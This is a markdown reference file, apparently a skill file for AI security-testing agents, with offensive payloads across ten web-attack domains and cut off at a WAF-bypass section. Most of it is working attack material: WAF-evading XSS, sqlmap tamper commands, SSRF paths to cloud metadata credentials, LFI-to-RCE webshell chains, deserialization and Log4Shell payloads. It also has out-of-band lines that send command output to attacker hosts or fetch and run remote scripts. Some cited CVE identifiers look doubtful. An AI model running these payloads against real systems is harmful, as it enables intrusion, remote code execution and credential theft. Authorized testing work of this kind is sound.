---
name: bug-bounty-techniques
description: Exhaustive command-level reference across 14 offensive-security domains — 403/401 bypass, XSS, SQLi/NoSQLi, SSRF, LFI/RFI, RCE/SSTI/deserialization, recon, IDOR/access control, tech-specific flaws (nginx/Apache/PHP/Java/GraphQL/WordPress), WAF evasion, race conditions, open redirect/CSRF/CORS, attack chains, and tooling — with real payloads and 2024–2026 methodology for AI security testing agents.
sources: bug_bounty_reports, portswigger, owasp, hackerone_public
---

# Bug Bounty Offensive Security Techniques — Deep Reference for AI Security Testing Agents

## TL;DR
- This report delivers an exhaustive, command-level reference across 14 offensive-security domains — 403/401 bypass, XSS, SQLi/NoSQLi, SSRF, LFI/RFI, RCE/SSTI/deserialization, recon, IDOR/access control, tech-specific flaws, WAF evasion, race conditions, open redirect/CSRF/CORS, attack chains, and tooling — with real payloads, tool invocations, and 2024–2026 methodology suitable for encoding into automated testing agents.
- The highest-ROI, currently-effective techniques are: HTTP/2 single-packet race conditions (PortSwigger, Black Hat USA 2023), SSRF-to-cloud-metadata credential theft (defeated only by enforced IMDSv2 with hop limit 1), JWT RS256→HS256 algorithm confusion, GraphQL alias-batching rate-limit bypass (one HTTP request can carry hundreds-to-thousands of login/OTP operations while the limiter counts a single request, per PortSwigger's 2023 "Bypassing rate limiting using aliases" research and Imperva/PentesterLab; CrackQL by nicholasaleks defaults to 100 batch operations per document), nginx off-by-slash alias traversal, and php://filter chains for LFI-to-RCE — each confirmed in production bug bounty reports.
- For agent design, prioritize an OODA loop that (1) baselines the normal response, (2) mutates one request property at a time (path, header, method, encoding, protocol), (3) confirms out-of-band with a collaborator/interactsh listener, and (4) chains primitives (e.g., open redirect → SSRF → metadata → cloud keys), because single-property mutation plus OOB confirmation is what separates true positives from WAF noise.

## SECTION 1: 403/401 BYPASS TECHNIQUES

**Core principle (for agent logic):** A 403/401 is usually enforced by a reverse proxy, WAF, or framework rule matching on path, header, method, or protocol — not by the resource itself. To bypass, mutate one property at a time and diff each response (status, body length, body hash, `Content-Type`, `Location`, `Server`) against the baseline.\[1\] First determine whether the block is generic (request a random non-existent path like `/forbidden-baseline-8f3a`; if it returns the same 403 body, the block sits generically in front of the app) or path-specific (random path returns 404, only the target returns 403 — path/header/method mutations are most likely to work).\[1\]

### 1.1 Path Manipulation Bypasses
Trailing/suffix mutations: `/admin/`, `/admin/.`, `/admin//`, `/admin/./`, `/admin?`, `/admin#`, `/admin%20`, `/admin%09`, `/admin.json`, `/admin.css`, `/admin.html`, `/admin;/`, `/admin..;/`, `/admin;foo=bar`. Mid-path and traversal: `/./admin/..`, `/%2e/admin`, `/admin/..%2f`, `/%2e%2e/`, `....//`, `..;/`. Encoding layers: double URL-encode (`%252e`, `%252f`, `%2e%2e%2f`), overlong UTF-8 / Unicode (`%c0%af`, `%c0%ae`, `%ef%bc%8f`, `%c1%9c`), `%uXXXX` forms. Windows/IIS backslash: `\admin`, `/admin\..\`. Recursive fuzzing below the blocked node is highly effective: if `/log` returns 403, `/log/log.txt` may return 200 — fuzz the subtree with ffuf.\[1\]

### 1.2 HTTP Header Bypasses
IP-trust spoofing headers (set to `127.0.0.1`, `localhost`, or an internal IP): `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `X-Remote-IP`, `X-Remote-Addr`, `X-Client-IP`, `True-Client-IP`, `Cluster-Client-IP`, `X-ProxyUser-IP`, `Forwarded`, `CF-Connecting-IP`, `X-Custom-IP-Authorization`. URL-rewrite headers that make the edge serve a different internal path: `X-Original-URL: /admin`, `X-Rewrite-URL: /admin`, `X-Override-URL` (confirmed against httpbin-style stacks where `X-Original-URL`/`X-Rewrite-URL` returned 200 for a path that was 403 directly).\[2\] Host-based: `Host: localhost`, `Host: 127.0.0.1`, `X-Forwarded-Host`, `X-Host`. Referer/Origin spoofing (`Referer: https://target.com/`) and crawler User-Agents (`Googlebot/2.1`, `Bingbot/2.0`) also bypass some allow-lists.\[3\]

### 1.3 HTTP Method/Verb Tampering
Rotate the verb: `GET → POST → PUT → PATCH → DELETE → OPTIONS → TRACE → HEAD → CONNECT` (e.g., an `OPTIONS` request returning 200 on a path that 403s on GET).\[2\] Method-override headers: `X-HTTP-Method-Override`, `X-HTTP-Method`, `X-Method-Override`. HTTP version downgrade (`HTTP/1.0` without `Host`, vs `HTTP/1.1`, vs `HTTP/2`) can change which rule fires.

### 1.4 Advanced 403 Bypass
API versioning swap (`/api/v1/admin → /api/v2/admin → /api/v3/admin` — older versions often lack authorization checks), web cache poisoning, host-header poisoning to reach virtual hosts, HTTP request smuggling to prepend a privileged path, and nginx-specific `X-Accel-Redirect`/off-by-slash tricks (Section 9.1). **Tools:** `nomore403` (devploit) is the current standard — it baselines, auto-calibrates against non-existent paths,\[4\] and runs technique sets `verbs, verbs-case, headers, endpaths, midpaths, double-encoding, http-versions, path-case`.\[5\] Example: `./nomore403 -u https://target.tld/admin --technique verbs,headers,path-case,double-encoding --bypass-ip 127.0.0.1`.\[6\] Other tools: `byp4xx`, `403bypasser`, `4-ZERO-3/400OK`, `403jump`, `bypass-403`, and `dirsearch`/`ffuf` for subtree fuzzing.

## SECTION 2: XSS — COMPLETE ATTACK VECTOR TAXONOMY

### 2.1 Context-Specific XSS
- **HTML body:** `<script>alert(1)</script>`, `‹img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `<svg/onload=alert(1)>` (the slash is valid syntax many filters miss).\[7\]
- **HTML attribute:** break out with `" onmouseover="alert(1)` or inject `" autofocus onfocus=alert(1) x="`, `" onpointerover=alert(1) "`, `" style=animation-name:x onanimationstart=alert(1) "`.\[8\]
- **JavaScript string:** `'-alert(1)-'`, `'-alert(1)//`, `\'-alert(1)//`, or break the script block entirely with `</script><script>alert(1)</script>`.
- **URL (href/src):** `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`.
- **CSS:** `expression()` (legacy IE), `url()`, `@import`.
- **SVG:** `<svg onload=alert(1)>`, `<svg><script>alert(1)</script></svg>`.
- **Template literal / JSON injection:** `${alert(1)}` in backtick strings; JSON value injection that breaks into a surrounding `<script>` block.

### 2.2 Filter/WAF Bypass for XSS
Case variation (`<ScRiPt>`, `‹IMG SRC=x ONERROR=...>`); tag morphing with low-signature tags — `<details open ontoggle=alert(1)>` (the `open` attribute fires `ontoggle` with zero interaction)\[7\] and `<marquee onstart=alert(1)>`. Event-handler alternatives beyond onerror/onload: `onfocus`, `onmouseover`, `ontoggle`, `onbeforeprint`, `onhashchange`, `onpageshow`, `onpopstate`, `onresize`, `onscroll`, `ontransitionend`, `onanimationstart`, `onpointerover`. Encoding chains (HTML entities → URL → Unicode), including superfluous leading zeros in entities and entities without trailing semicolons (`&#106;avascript:`, `&#x6A;avascript:`). JS obfuscation: `eval(atob('YWxlcnQoMSk='))`, `Function(atob('YWxlcnQoMSk='))()`,\[9\] `[].constructor.constructor('alert(1)')()`, string concatenation (`window['ale'+'rt']`),\[10\] `String.fromCharCode()`. Comment insertion (`<scr<!-- -->ipt>`, `‹img/src=x onerror=alert(1)>`). **Double/malformed encoding is the single most reliable WAF bypass** because\[9\] WAFs typically decode once while the browser decodes more: e.g. `%253Cscript%253Ealert(1)%253C%252Fscript%253E`.\[11\] Documented wild bypasses: prefix `<!` before a payload to bypass AWS WAF (`<!<script>confirm(1)</script>`);\[12\] carriage-return-cushioned JS URI for Cloudflare (`‹iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt\`1\`'>`); `<svg onload\r\n=$.globalEval("al"+"ert()");>` for Imperva Incapsula.\[12\]

### 2.3 DOM-Based XSS Vectors
- **Sources:** `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, `localStorage`, `IndexedDB`.
- **Sinks:** `document.write()`, `innerHTML`, `outerHTML`, `eval()`, `setTimeout()`, `setInterval()`, `Function()`, `jQuery.html()`, `$.globalEval()`, AngularJS expression evaluation, Vue template injection, React `dangerouslySetInnerHTML`.

### 2.4 Advanced XSS
Mutation XSS (mXSS) via browser parser round-trips and sanitizer differences (e.g., DOMPurify bypasses tracked under CVE identifiers such as CVE-2025-26791).\[7\] Blind XSS with callback servers (XSS Hunter, `bxss.me`, `xss.report`) — confirm out-of-band. XSS via file upload (SVG/HTML/XML with wrong or image MIME type; polyglot image+HTML). XSS in server-side PDF generation (wkhtmltopdf, Puppeteer/headless Chrome). XSS via HTML email rendering and markdown/rich-text renderers. **Polyglots** (spray when you don't know the context): `javascript:/*--></title></style></textarea></script></noscript><svg onload=alert(1)>`\[13\] and the shorter `'"\`>‹img src=x onerror=alert(1)>`.\[13\] **CSP bypass:** abuse whitelisted trusted CDNs and JSONP endpoints (if CSP allows `*.google.com`, load a Google-hosted JSONP callback that executes your function);\[7\] `base-uri` manipulation; AngularJS/Vue CSTI gadgets on whitelisted framework hosts; nonce leakage via CSS/cache; `iframe srcdoc` abuse.\[14\]

## SECTION 3: SQL INJECTION — ADVANCED TECHNIQUES

### 3.1 Injection Points Beyond GET/POST
HTTP headers (`User-Agent`, `Referer`, `X-Forwarded-For`, `Cookie`, `Accept-Language`, `X-Requested-With`); JSON/XML request bodies; upload filenames; GraphQL query arguments and variables; WebSocket messages; REST path segments (`/api/users/1 OR 1=1`). sqlmap can target a header: `sqlmap -u https://target/check.php --headers="X-Forwarded-For:1*" -p X-Forwarded-For --level=5 --risk=3`.\[15\]

### 3.2 WAF Bypass for SQLi
Whitespace alternatives: `%09` (tab), `%0a`, `%0b`, `%0c`, `%0d`, `%a0`, `/**/`. Inline/versioned comments: `/*!50000UNION*/`, `/*!SELECT*/`. Case alternation: `uNiOn SeLeCt`. Double URL-encoding: `%2527` for a single quote. Hex: `0x61646d696e` for `'admin'`. Concatenation: `CONCAT()`, `||`, `+`. Scientific notation: `1e0UNION`. HTTP Parameter Pollution: `id=1&id=2`. NoSQL/JSON operator syntax (Section 3.3). **sqlmap tamper scripts** automate most of these; the workhorse combination for ModSecurity/Cloudflare is `--tamper=space2comment,between,randomcase,charencode,equaltolike`.\[16\] Key tampers: `space2comment` (space→`/**/`), `space2plus`, `space2randomblank`, `randomcase`, `between` (`>`→`NOT BETWEEN 0 AND`,\[17\] `=`→`BETWEEN`), `charencode`, `charunicodeencode`, `apostrophenullencode` (`'`→`%00%27`), `equaltolike`, `versionedmorekeywords`, `modsecurityversioned`,\[17\] `base64encode`. List all with `sqlmap --list-tampers`. Full command: `sqlmap -r req.txt --level=5 --risk=3 --random-agent --tamper=space2comment,between,randomcase --dbs`.

### 3.3 Database-Specific Tricks
- **MySQL:** `information_schema`, `/*!union*/`, `GROUP_CONCAT()`, `LOAD_FILE()`, `INTO OUTFILE` (webshell write), `BENCHMARK()`/`SLEEP()` time-based.
- **PostgreSQL:** `pg_sleep()`, `string_agg()`, `CHR()`, `COPY ... TO/FROM PROGRAM`, large objects.
- **MSSQL:** `WAITFOR DELAY '0:0:5'`, `xp_cmdshell`, `sp_OACreate`, `OPENROWSET`, linked servers.
- **Oracle:** `UTL_HTTP` (OOB), `DBMS_PIPE`, `ALL_TAB_COLUMNS`, `CTXSYS`.
- **SQLite:** `sqlite_master`, `load_extension()`.
- **NoSQL / MongoDB:** operator injection — `{"$ne": null}`, `{"$gt": ""}`, `{"$regex": "^adm"}`, `{"$where": "sleep(5000)"}` (JS eval → DoS/RCE surface), `{"$in": ["admin","root"]}`. URL-encoded form equivalents: `username[$ne]=x&password[$ne]=x`. Express body-parser and PHP both auto-deserialize `param[$ne]=x` into operator objects, so test bracket notation on every parameter.

### 3.4 Second-Order & Advanced SQLi
Stored/second-order injection (input stored then triggered in a different query context). Out-of-band exfiltration via DNS/HTTP (Oracle `UTL_HTTP`, MySQL `LOAD_FILE('\\\\attacker\\share')`). UNION-based file read and webshell write. Error-based extraction via `EXTRACTVALUE()` and `UPDATEXML()` (MySQL). **Tools:** sqlmap (with tamper scripts above), `ghauri` (r0oth3x49 — strong time-based-blind handling;\[18\] `ghauri -u "http://host/vuln.php?id=1" --dbs`\[19\] or `ghauri -r post.txt --level=3 --batch`),\[20\] `SQLNinja` (MSSQL), and NoSQL-specific `nosqli`.

## SECTION 4: SSRF — SERVER-SIDE REQUEST FORGERY

### 4.1 Discovery Points
Fuzz URL-ish parameters: `url=`, `link=`, `src=`, `dest=`, `redirect=`, `uri=`, `path=`, `window=`, `next=`, `data=`, `reference=`, `site=`, `html=`, `val=`, `validate=`, `domain=`, `callback=`, `feed=`, `host=`, `port=`, `to=`, `out=`, `view=`, `dir=`. Feature-level sinks: file import/export, webhook configuration, URL preview/unfurl (Slack-style link previews), PDF/document generators, image fetch/resize services, SVG/XML parsing, HTML-to-PDF conversion, email "fetch remote resource," and video/audio URL processing.

### 4.2 Cloud Metadata Endpoints
- **AWS:** `http://169.254.169.254/latest/meta-data/`, `/latest/user-data/`, and the credential path `/latest/meta-data/iam/security-credentials/<ROLE>`.\[21\] IMDSv2 requires a PUT-issued token first: `TOKEN=$(curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')` then `curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/`. \[22\] Most SSRF primitives cannot issue the PUT, which is why enforced IMDSv2 blunts the attack.\[22\]
- **GCP:** `http://metadata.google.internal/computeMetadata/v1/` (and `http://169.254.169.254/computeMetadata/v1/`), requires header `Metadata-Flavor: Google`.\[23\]
- **Azure:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01` and `/metadata/identity/oauth2/token`, requires header `Metadata: true`.\[24\]
- **DigitalOcean:** `http://169.254.169.254/metadata/v1.json`, \[24\] `/metadata/v1/`.
- **Alibaba:** `http://100.100.100.200/latest/meta-data/`.
- **Oracle Cloud:** `http://169.254.169.254/opc/v1/instance/`. \[25\] Also test the Kubernetes kubelet read-only port (10255) and in-cluster metadata when SSRF lands inside a pod.\[26\]

### 4.3 IP Bypass for SSRF
Alternate encodings of `127.0.0.1`/`169.254.169.254`: decimal (`http://2130706433`), hex (`http://0x7f000001`), octal (`http://0177.0.0.1`), IPv6 (`http://[::1]`, `http://[0000::1]`, `http://[::ffff:127.0.0.1]`, `http://[::ffff:169.254.169.254]`). \[25\] Parser-confusion allow-list bypasses: `http://allowed.com@169.254.169.254/`, `http://169.254.169.254#@allowed.com/`, `http://169.254.169.254./` (trailing dot FQDN), `http://ALLOWED.com%2f@169.254.169.254/`. \[26\] DNS rebinding (register a domain whose A record flips to `127.0.0.1`/`169.254.169.254`), open-redirect/URL-shortener chains that bounce the server-side fetch to the metadata IP,\[22\] and rare protocols: `gopher://` (RCE against Redis/MySQL/FastCGI/SMTP via Gopherus), `dict://`, `file://`, `tftp://`, `ldap://`, `ftp://`.

### 4.4 Blind/Partial SSRF
Detect via response-time differences (internal host up vs filtered), DNS/HTTP interaction on a collaborator (`interactsh-client`, Burp Collaborator), and error-message differencing (distinct errors for different internal hosts/ports reveal an internal port scanner). **Tools:** `SSRFmap` (swisskyrepo) — `python ssrfmap.py -r request.txt -p url -m readfiles,portscan`\[27\] with modules including `readfiles`, `portscan`, `redis`, `fastcgi`, `mysql`, `smtp`, `aws`/`gce`/`alibaba`/`digitalocean` metadata;\[28\] `Gopherus` (tarunkant) generates `gopher://` payloads for MySQL, FastCGI/PHP-FPM, Redis, Memcached, Zabbix, and SMTP.\[29\]

## SECTION 5: LFI/RFI/PATH TRAVERSAL

### 5.1 Basic Traversal Payloads
`../../../etc/passwd` (Linux), `..\..\..\windows\system.ini` (Windows). Null-byte truncation `../../../etc/passwd%00` (PHP < 5.3.4). Double-encoding `%252e%252e%252f`. Overlong UTF-8 `%c0%ae%c0%ae/`, `%c0%af`. Filter-defeating variants: `....//....//`, `..;/`, `..%00/`, `..%0d/`, `..%5c`, `./languages/../../../../etc/passwd`.

### 5.2 PHP-Specific LFI Techniques
Source disclosure: `php://filter/convert.base64-encode/resource=index.php` \[30\] (works on default config, `allow_url_include=off`). RCE via wrappers when enabled: `php://input` with a POST body containing `<?php system($_GET['cmd']); ?>`;\[30\]\[31\] `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==`; `expect://id`. Archive wrappers: `zip://uploads/shell.zip%23shell.php`, `phar://uploads/shell.phar`. **php://filter chain to RCE** (no `allow_url_include` needed) — generate with Synacktiv's `php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'`\[32\] and request `?param=php://filter/<CHAIN>/resource=php://temp&cmd=id`.

### 5.3 LFI to RCE Escalation
Log poisoning is the canonical two-request chain: taint a log the server writes (send `User-Agent: <?php system($_GET["cmd"]); ?>` into `/var/log/apache2/access.log`\[30\] or `/var/log/nginx/access.log`), then include that log via the LFI sink with `&cmd=id`.\[33\] Also: `/proc/self/environ` injection (PHP in `User-Agent`), PHP session-file inclusion\[30\] (`/var/lib/php/sessions/sess_<PHPSESSID>` or `/tmp/sess_<ID>` poisoned via a controllable session value), SSH `auth.log`/vsftpd log poisoning, upload+include chains, and `/proc/self/fd/` descriptor inclusion.

### 5.4 Critical Files to Read
- **Linux:** `/etc/passwd`, `/etc/shadow`, `/etc/hosts`, `/proc/self/environ`, `/proc/version`, `/proc/self/cmdline`, `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/home/<user>/.ssh/id_rsa`, `/home/<user>/.bash_history`.
- **Windows:** `C:\Windows\System32\config\SAM`, `C:\Windows\win.ini`, `C:\inetpub\wwwroot\web.config`, `C:\Users\<user>\Desktop\...`.
- **App-specific:** `.env`, `config.php`, `wp-config.php`, `database.yml`, `settings.py`, `application.properties`, `.git/config`. **Tools:** `dotdotpwn`, `LFISuite`, `lfifinder`, and the php_filter_chain generator.

## SECTION 6: RCE — REMOTE CODE EXECUTION VECTORS

### 6.1 Command Injection
Metacharacters: `; | & && || \` $() \n %0a`. Blind detection: time delay (`; sleep 5`, `& ping -c 5 127.0.0.1`, Windows `timeout`) and OOB (`; curl http://attacker/$(whoami)`, `; nslookup $(id | base64).attacker.tld`, `| dig $(whoami).attacker.tld`).\[34\] Filter bypass: quote/backslash insertion (`w'h'o'a'm'i`, `wh\oami`), `${IFS}`/`$IFS$9`/`{cmd,arg}` for space restrictions, brace expansion, `$(rev<<<imaohw)`, hex (`$(echo -e "\x77\x68\x6f\x61\x6d\x69")`), base64 (`echo d2hvYW1p|base64 -d|sh`),\[35\] and PATH slicing (`${PATH:0:1}` → `/`). Windows: `^`, `&`, `|`, `%WINDIR%`, PowerShell `iex (iwr http://attacker/a.ps1)`.

### 6.2 Server-Side Template Injection (SSTI)
Detection polyglot that provokes errors across engines: `${{<%[%'"}}%\`.\[36\] Arithmetic confirmation: `{{7*7}}`, `${7*7}`, `#{7*7}`,\[37\] `<%= 7*7 %>`, `*{7*7}`. Fingerprint: `{{7*7}}`→49 and `{{7*'7'}}`→`7777777` ⇒ Twig; `{{7*'7'}}`→49 ⇒ Jinja2; `${7*7}`→49 ⇒ Freemarker/JSP EL; `#{7*7}` ⇒ Thymeleaf/Mako;\[38\] `<%= 7*7 %>` ⇒ ERB.
- **Jinja2 (Python):** `{{config}}`, `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`, `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`.\[37\]
- **Twig (PHP):** `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`.\[37\]
- **Freemarker (Java):** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`\[37\] or `${"freemarker.template.utility.Execute"?new()("id")}`.
- **Velocity (Java):** `#set($rt=$x.class.forName('java.lang.Runtime'))...$rt.getRuntime().exec('id')`.\[37\]
- **ERB (Ruby):** `<%= system('id') %>`.
- **Handlebars / Pebble:** gadget chains walking `class.forName('java.lang.Runtime')`.

### 6.3 Deserialization Attacks
- **Java:** `ysoserial` gadget chains (CommonsCollections1–7, Spring1/2, Groovy1, C3P0).\[39\] Modern JDKs need reflective opens or ysoserial emits a 0-byte payload: `java --add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.lang.reflect=ALL-UNNAMED --add-opens java.base/java.io=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections6 'id'`.\[40\]
- **PHP:** `unserialize()` object injection; `phar://` deserialization triggered by filesystem functions.
- **Python:** `pickle.loads()` RCE via `__reduce__`.
- **.NET:** `BinaryFormatter`, `ObjectStateFormatter`, ViewState deserialization (ysoserial.net).
- **Node.js:** `node-serialize` IIFE payloads.

### 6.4 File Upload to RCE
Extension bypass: `.php5`, `.phtml`, `.phar`, `.pHp`, `.php.jpg`, `.php%00.jpg`, double extension with Apache `AddHandler`.\[41\] Content-Type spoof (`image/jpeg` body containing PHP). Magic-byte polyglots (`GIF89a;<?php system($_GET['c']); ?>`, JPEG header + PHP). `.htaccess` upload to redefine the handler: `AddType application/x-httpd-php .rce` then upload `shell.rce`.\[42\] Race condition between upload and AV/cleanup. SVG with embedded `<script>`. Parameter-mismatch bugs (validate `files[name]` but save to a separate user-controlled `fullpath` — e.g., TinyFileManager v2.6 CVE).\[43\] Real-world: Apache Struts2 `FileUploadInterceptor` path traversal (CVE-2024-53677), which NVD rates CVSS 9.8 CRITICAL (published 2024-12-11, advisory S2-067; affects Struts 2.0.0–6.3.0.2, fixed in 6.4.0 via the new ActionFileUpload mechanism, exploited via the `top.uploadFileName` multipart parameter — note Red Hat scores it 9.0 and several vendors cite 9.5, but NVD is authoritative at 9.8); Halo polyglot BMP+HTML+JAR upload (CVE-2024-56156).\[44\] **Tools:** `fuxploider`, modzero's Burp Upload Scanner. Defense that kills polyglots: server-side image re-encoding (Pillow/sharp)\[45\] plus `Content-Disposition: attachment`.

## SECTION 7: RECONNAISSANCE & ATTACK SURFACE EXPANSION

### 7.1 Subdomain Discovery
Certificate transparency (`crt.sh`, Censys, Google CT); passive aggregation (`subfinder -d target.com -all -recursive`, `amass enum -passive`, `assetfinder`, SecurityTrails, VirusTotal, AlienVault OTX, RapidDNS, Chaos); active brute force (`shuffledns`, `puredns`, `dnsx` with resolvers + `n0kovo_subdomains_huge.txt`);\[46\] permutation (`altdns`, `gotator`, `regulator`); virtual-host discovery (`ffuf -H "Host: FUZZ.target.com"`); cloud-specific S3/Azure enumeration. `rix4uni/subdog` aggregates 17+\[47\] passive sources in parallel (`cat domains | subdog --all`).

### 7.2 Content & Endpoint Discovery
Directory brute force: `ffuf`, `feroxbuster` (Rust, recursive by default to depth 4,\[48\] surfaces 401/403 by default: `feroxbuster -u https://target -w wordlist -x php,html -t 100`), `dirsearch -u https://target -e php,asp,aspx,jsp,html,bak -r`,\[49\] `gobuster`. Historical/crawled URL harvesting: `gau`, `waybackurls`, `katana -list live.txt -jc -kf all`, `hakrawler`\[50\] — then `sort -u`/`uro` to dedupe. Target-specific paths: `/wp-admin`, `/administrator`, `/.env`, `/api/swagger.json`, `/graphql`, `/actuator`, `/server-status`. JS analysis: `LinkFinder`, `SecretFinder`, `getJS`, source maps (`.js.map`). Standard files: `robots.txt`, `sitemap.xml`, `crossdomain.xml`, `security.txt`, `humans.txt`. Backup/temp: `.bak`, `.old`, `.orig`, `.copy`, `~`, `.swp`, `.save`, `.tmp`.

### 7.3 Secret Discovery & Information Leakage
`.git` exposure (`/.git/HEAD`, `/.git/config` → `git-dumper http://site/.git ./out`;\[51\] detect at scale with `rix4uni/dotgitfinder`).\[52\] `.env` with DB creds/API keys. Secrets in JS (keys, tokens, endpoints, comments) via `trufflehog filesystem ./` or `trufflehog git https://repo --results=verified,unknown`\[53\]\[54\] (verifies liveness) and `gitleaks detect --source . -v`.\[55\] Error pages with stack traces; disclosing headers (`Server`, `X-Powered-By`, `X-AspNet-Version`, `Via`); `phpinfo()` pages; debug endpoints (`/_debug`, `/debug/pprof`, `/trace`). **Spring Boot Actuator:** `/actuator/env`, `/actuator/heapdump` (JVM memory dump\[56\] — grep for plaintext secrets in Eclipse MAT), `/actuator/configprops`, `/actuator/jolokia` (arbitrary JMX).\[56\] Per Wiz research (wiz.io/blog/spring-boot-actuator-misconfigurations), 60% of cloud environments have at least one Spring Boot Actuator instance, 11% have instances publicly exposed to the Internet, 24% of environments with exposed Actuators have misconfigured instances, and only 2.3% of exposed Spring Boot Actuator instances have their heap dump endpoint exposed. WordPress user enumeration: `/wp-json/wp/v2/users`. GraphQL introspection: `{__schema{types{name,fields{name}}}}`.

### 7.4 Port Scanning & Service Discovery
Full-range scans on key hosts (`naabu -l hosts -nmap -rate 5000`,\[46\] `nmap -p- -sV -sC`). External intel: Shodan, Censys, FOFA, ZoomEye. Don't skip UDP: SNMP (161), DNS (53), TFTP (69).

**Canonical recon pipeline:** `subfinder -d target.com -all -recursive | httpx -silent -title -tech-detect -sc | katana -silent -jc | nuclei -severity low,medium,high,critical`.\[57\] `rix4uni/GarudRecon`\[58\] wraps this whole flow (`garudrecon mediumscope -d target.com`).\[58\]

## SECTION 8: IDOR & BROKEN ACCESS CONTROL

### 8.1 IDOR Discovery Points
Numeric IDs in paths (`/api/users/123`), IDs in POST/PUT bodies, cookies, and headers; UUID/GUID guessing (sequential-creation-time leakage); GraphQL node IDs (`node(id:"...")`); file references (`/download?file=report_123.pdf`); and systematic endpoint enumeration with two accounts (A's token requesting B's object IDs). Alias-batch many IDs in one GraphQL request to exfiltrate at scale.\[59\]

### 8.2 Access Control Bypass
Horizontal (same role, another user's data) and vertical (user→admin) escalation. Parameter/mass-assignment injection: add `role=admin`, `is_admin=true`, `group=administrators` to update requests. Forced browsing to admin pages. **JWT manipulation:** `"alg":"none"` (and case variants `NoNe`/`NONE` to defeat case-insensitive blocklists)\[60\] with signature stripped; **RS256→HS256 algorithm confusion** — re-sign the token with the server's RSA *public* key as the HMAC secret\[61\] (confirmed in production, e.g., HackerOne #3800870 against 8x8's connect.8x8.com API, 2024);\[61\] `kid` header injection (path traversal `kid:"../../../dev/null"` then sign with empty string,\[62\] or SQLi `kid:"x' UNION SELECT 'key'--"`);\[62\] `jku`/`x5u`/`jwk` pointing to an attacker-hosted JWKS.\[63\] Tool: `jwt_tool -X a` (algorithm confusion), `-X s` (JWKS spoof), `-I -pc role -pv admin` (inject claim).\[62\] Cookie tampering (`user_role`, `user_id`). API versioning (older `/v1/` lacks checks). Mass assignment via extra JSON fields.

## SECTION 9: TECHNOLOGY-SPECIFIC ATTACK VECTORS

### 9.1 Apache/Nginx Misconfigurations
- **nginx off-by-slash / alias traversal (Orange Tsai, Black Hat 2018):** when `location /static` (no trailing slash) maps to `alias /var/www/static/;` (trailing slash), `/static../app/config.py` escapes the directory\[64\] → source disclosure. A tell is that removing the slash returns the same response.\[65\] If `merge_slashes off`, double slashes aren't normalized before matching, enabling deeper traversal.\[66\] Detect with PortSwigger's `nginx-alias-traversal` Burp extension,\[67\] `gixy` (config static analysis), or `nginxpwner`. Also test `X-Accel-Redirect` for 401/403 bypass, CRLF via `$uri` in redirects,\[68\] and `proxy_pass` off-by-slash (`/api../` → origin root).
- **Apache:** `.htaccess` override, `mod_status`/`mod_info`/`server-status`, `AddHandler`/`AddType` upload abuse.
- **Both:** path-normalization differences enable the 403 bypasses in Section 1.

### 9.2 PHP-Specific
Type juggling in loose comparisons (`"0e123" == "0e456"` → both treated as `0` float; magic-hash bypass of `==`); `strcmp()` array bypass; object injection via `unserialize`; `php://filter` source disclosure and filter-chain RCE; `disable_functions` bypass; legacy `preg_replace` `/e` modifier; `assert()` injection. Note CVE-2026-109618/109619 (`session.upload_progress` heap UAF)\[69\] as an emerging PHP RCE primitive to watch.

### 9.3 Java/Spring
Exposed Actuator (Section 7.3) → `/env` + MySQL JDBC `spring.datasource.url` deserialization → RCE,\[70\] or `/heapdump` secret extraction, or `/jolokia` JMX. SpEL injection. **Log4Shell (CVE-2021-44228)** `${jndi:ldap://attacker/x}` and variants — pair with `ysoserial` + a JNDI exploit kit (e.g., JNDI-Exploit-Kit)\[71\] for the gadget-based RCE. ObjectInputStream deserialization. XXE in XML parsers. JNDI injection. Spring4Shell (CVE-2022-22965).\[56\]

### 9.4 GraphQL
Introspection enabled → full schema dump (`{__schema{types{name,fields{name}}}}`;\[72\] visualize with GraphQL Voyager/InQL). When introspection is disabled: field-suggestion ("Did you mean") fuzzing to reconstruct schema,\[59\] and try GET-based or authenticated-only introspection. **Alias batching** sends many operations in one HTTP request to bypass rate limits;\[72\] the DEV Community write-up "Alias Batching: 1 HTTP Request, 6,400 Authentication Attempts" documents this scale, and systemshardening.com demonstrates a systematic 10,000 login attempts in one HTTP request (100 aliases × a 100-operation batch array) for OTP/2FA brute force; aliases also bypass WAFs that only block JSON-array batching.\[59\] Resolver-level authorization bypass (per-field auth gaps — e.g., Shopify HackerOne #2207248, confirmed at hackerone.com/reports/2207248: reporter blaklis found an IDOR affecting the BillingInvoice ID in both the `BillingDocumentDownload` and `BillDetails` GraphQL operations, letting staff access some information on other shops, disclosed 2024-02-08 with a US$5,000 bounty). Nested-query DoS via circular references. **Tools:** `graphql-cop`,\[72\] `CrackQL`, `InQL`.

### 9.5 WordPress
`xmlrpc.php` (credential brute force via `system.multicall`, pingback SSRF, DoS); REST user enumeration (`/wp-json/wp/v2/users`); vulnerable plugins/themes (WPScan); `wp-config.php` exposure; `debug.log` exposure.

## SECTION 10: WAF BYPASS — UNIVERSAL TECHNIQUES

### 10.1 Encoding-Based
Single/double/triple URL-encoding (WAF decodes once, app/browser decodes more); Unicode normalization and overlong UTF-8; HTML entities (decimal/hex/named, with/without trailing semicolon, leading zeros); Base64 in parameters; hex encoding.

### 10.2 Structure-Based
